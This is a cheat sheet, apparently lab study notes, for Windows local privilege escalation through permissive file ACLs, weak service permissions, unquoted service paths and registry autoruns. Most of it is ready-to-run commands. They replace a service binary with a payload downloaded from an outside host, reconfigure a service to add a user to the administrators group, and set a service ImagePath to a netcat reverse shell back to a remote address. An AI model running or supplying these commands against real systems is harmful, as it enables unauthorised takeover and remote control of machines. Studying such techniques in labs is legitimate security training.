- [ ] Permissive File System ACLs
- [ ] Weak Service Permissions
- [ ] Unquoted Service Path
- [ ] Permissive Registry ACLs
- [ ] Modifiable Registry Autorun Binary

Permissive File System ACLs!!!
```powershell
# Sharup === Modifiable Service Binaries ====
.\SharpUp.exe audit
# Check permission on the binary using iacls
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
# replace the service binary
wget "http://10.10.14.85/rev.exe" -outfile SecurityService.exe
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
# start service
sc.exe start SecurityService
```
Weak Service Permissions!!!
```powershell
# Sharpup === Modifiable Services ===
SharpUp.exe audit
# Checking Permissions with AccessChk
accesschk.exe /accepteula -quvcw WindscribeService
sc.exe query WindscribeService
sc.exe sdshow WindscribeService
# configure the service
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
# stop and start service
sc.exe stop WindscribeService
sc.exe start WindscribeService
```
Unquoted Service Path!!!
```powershell
# query service infos
sc.exe qc SystemExplorerHelpService
sc.exe sdshow SystemExplorerHelpService
# access rigth on folders
accesschk.exe "mrb3n" -f "C:\Program Files (x86)\"
icacls "C:\Program Files (x86)\"
icacls "C:\Program Files (x86)\" /t
# searching for unqoted service path
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
Permissive Registry ACLs!!!
```powershell
# Searching for weak service ACLs in the Windows Registry
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
# Changing ImagePath with PowerShell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
Modifiable Registry Autorun Binary!!!
```powershell
# Check Startup Programs
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
# sysinternals
Autoruns64.exe 
# Ref
https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2
```